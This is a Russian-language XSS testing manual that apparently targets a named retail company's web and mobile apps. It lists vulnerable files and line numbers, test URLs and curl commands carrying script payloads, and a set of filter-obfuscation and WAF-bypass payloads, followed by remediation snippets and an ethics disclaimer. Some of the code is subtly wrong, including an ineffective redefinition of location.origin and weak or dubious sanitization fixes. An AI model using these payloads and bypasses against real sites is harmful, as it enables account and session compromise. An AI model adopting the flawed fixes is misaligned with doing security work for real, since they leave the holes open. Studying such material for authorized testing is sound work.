# 🔥 AKUMA XSS Testing Manual 🔥
## Пошаговое руководство по тестированию XSS уязвимостей

### 📋 Краткий обзор найденных уязвимостей:

1. **DOM XSS (4 критичных)** - window.location.origin без валидации
2. **Stored XSS (2 критичных)** - База данных без санитизации
3. **Reflected XSS (1 критичный)** - req.ip прямо в ответ
4. **dangerouslySetInnerHTML (13 потенциальных)** - React без санитизации

---

## 🚀 Запуск автоматизированного тестера

### Базовый запуск (все тесты):
```bash
./akuma_xss_tester.py -u https://your-perekrestok-domain.com
```

### Тестирование конкретных типов XSS:
```bash
# Только DOM XSS
./akuma_xss_tester.py -u https://target.com --dom

# Только Stored XSS  
./akuma_xss_tester.py -u https://target.com --stored

# Только Reflected XSS
./akuma_xss_tester.py -u https://target.com --reflected

# С указанием количества потоков
./akuma_xss_tester.py -u https://target.com -t 20
```

---

## 🎯 Ручное тестирование уязвимостей

### 1. DOM XSS в BellNotification.tsx

**Уязвимый код (строка 76):**
```javascript
url: `${window?.location?.origin}${route}`,
```

**Тестовые URL:**
```
https://your-domain.com/mobile5ka/src/layouts/DefaultLayout/BellNotification/#<script>alert('AKUMA')</script>

https://your-domain.com/mobile5ka/src/layouts/DefaultLayout/BellNotification/#<img src=x onerror=alert('DOM_XSS')>

https://your-domain.com/mobile5ka/src/layouts/DefaultLayout/BellNotification/#javascript:alert('HACKED')
```

**Как тестировать:**
1. Открой браузер (лучше в приватном режиме)
2. Вставь URL с payload'ом
3. Нажми Enter
4. Если увидишь alert - БИНГО! 🎉

### 2. DeepLink XSS в HTML файлах

**Уязвимые файлы:**
- `/web-mystery-shopper/join-by-referral.html` (строка 75)
- `/web-mystery-shopper/deep-link.html` (строка 74)

**Тестовые URL:**
```
https://your-domain.com/web-mystery-shopper/deep-link.html?deepLink=javascript:alert('AKUMA_DEEPLINK')

https://your-domain.com/web-mystery-shopper/join-by-referral.html?deepLink=data:text/html,<script>alert('HACKED')</script>
```

### 3. Stored XSS в getLargeEdadealFeed.ts

**Тест через cURL:**
```bash
curl -X POST https://your-domain.com/feeds/edadeal/large \
  -H "Content-Type: application/json" \
  -d '{"catalog": "<script>alert(\"AKUMA_STORED\")</script>", "offers": ["<img src=x onerror=alert(\"STORED_XSS\")>"]}'
```

**Затем проверь этот URL в браузере:**
```
https://your-domain.com/feeds/edadeal/large
```

### 4. Reflected XSS через req.ip

**Тест через cURL с подделкой IP:**
```bash
# Подделываем IP хедерами
curl -H "X-Forwarded-For: <script>alert('AKUMA_IP_XSS')</script>" \
     https://your-domain.com/status

curl -H "X-Real-IP: <img src=x onerror=alert('IP_REFLECTED')>" \
     https://your-domain.com/status

# Через прокси Burp Suite - измени хедеры
```

### 5. dangerouslySetInnerHTML в React

**Уязвимые компоненты:**
- `/atomic/pages/Trademark.tsx` (строка 90)
- `/lib/shared-components/src/components/CVM/CurrentOfferCard/` (строка 82)

**Тест через POST запрос:**
```bash
curl -X POST https://your-domain.com/atomic/pages/Trademark \
  -H "Content-Type: application/json" \
  -d '{"text": "<img src=x onerror=alert(\"REACT_XSS\")>"}'
```

---

## 🛠️ Инструменты для тестирования

### Burp Suite:
1. **Intruder** - для автоматического перебора payload'ов
2. **Repeater** - для ручного тестирования запросов
3. **DOM Invader** - для поиска DOM XSS

### Browser Console:
```javascript
// Проверка DOM pollution
Object.defineProperty(window.location, 'origin', {
    value: 'javascript:alert("AKUMA")//'
});

// Проверка localStorage XSS
localStorage.setItem('test', '<script>alert("LOCALSTORAGE_XSS")</script>');
```

### curl команды:
```bash
# Reflected XSS через параметры
curl "https://target.com/status?q=<script>alert('REFLECTED')</script>"

# XSS через хедеры
curl -H "User-Agent: <script>alert('UA_XSS')</script>" https://target.com/

# XSS в JSON
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"data": "<script>alert(\"JSON_XSS\")</script>"}'
```

---

## 🎪 Advanced техники обхода фильтров

### Обфускация:
```javascript
// Char codes
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,72,65,67,75,69,68,39,41))>

// Base64
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnSEFDS0VEJyk8L3NjcmlwdD4=">

// Unicode
<script>alert('HACK\u0045D')</script>

// HTML entities
<img src=x onerror=alert(&#39;HACKED&#39;)>
```

### Bypass WAF:
```javascript
// Double encoding
%253Cscript%253Ealert(%2522HACKED%2522)%253C/script%253E

// Mixed case
<ScRiPt>alert('HACKED')</ScRiPt>

// Alternative tags
<svg onload=alert('HACKED')>
<iframe srcdoc="<script>alert('HACKED')</script>">
<object data="javascript:alert('HACKED')">

// Event handlers
<input onfocus=alert('HACKED') autofocus>
<select onfocus=alert('HACKED') autofocus><option>AKUMA</option>

// Via CSS
<link rel=stylesheet href="javascript:alert('HACKED')">
<style>@import'javascript:alert("HACKED")';</style>
```

---

## 📊 Приоритизация уязвимостей

### 🔴 КРИТИЧНЫЕ (исправлять НЕМЕДЛЕННО):
1. **DOM XSS в BellNotification.tsx** - любой пользователь может выполнить JS
2. **Stored XSS в базе данных** - код выполняется у всех пользователей
3. **Reflected XSS через req.ip** - можно украсть сессии

### 🟡 ВАЖНЫЕ (исправлять в ближайшие дни):
1. **dangerouslySetInnerHTML** - потенциальная угроза при неправильном использовании
2. **DeepLink XSS** - ограниченные векторы атак

---

## 🛡️ Рекомендации по исправлению

### Для DOM XSS:
```javascript
// ПЛОХО:
url: `${window.location.origin}${route}`,

// ХОРОШО:
const sanitizedOrigin = window.location.origin.replace(/[^a-zA-Z0-9:\/\.-]/g, '');
url: `${sanitizedOrigin}${route}`,

// ИЛИ используй белый список доменов:
const allowedOrigins = ['https://perekrestok.ru', 'https://5ka.ru'];
const origin = allowedOrigins.includes(window.location.origin) ? 
  window.location.origin : 'https://perekrestok.ru';
```

### Для Stored XSS:
```javascript
// ПЛОХО:
res.write(`{"catalogs":${catalogsString},"offers":[`);

// ХОРОШО:
const sanitized = DOMPurify.sanitize(catalogsString);
res.write(`{"catalogs":${JSON.stringify(sanitized)},"offers":[`);
```

### Для Reflected XSS:
```javascript
// ПЛОХО:
ip: req.ip,

// ХОРОШО:
ip: req.ip.replace(/[<>'"&]/g, ''), // базовая санитизация
// ИЛИ
ip: validator.escape(req.ip), // используй библиотеку validator
```

### Для dangerouslySetInnerHTML:
```jsx
// ПЛОХО:
<div dangerouslySetInnerHTML={{ __html: trademark.text }} />

// ХОРОШО:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(trademark.text) }} />
```

---

## 🚨 ВНИМАНИЕ!
**Все эти тесты предназначены ТОЛЬКО для этичного тестирования безопасности собственных приложений!**

**Как говорит AKUMA: "С большой силой приходит большая ответственность... и еще большие баги!"** 😄

---

*Создано AKUMA - легендарным хакером микросервисов*
*"Баги не исчезают сами собой, их нужно находить и исправлять!" - Закон безопасности*
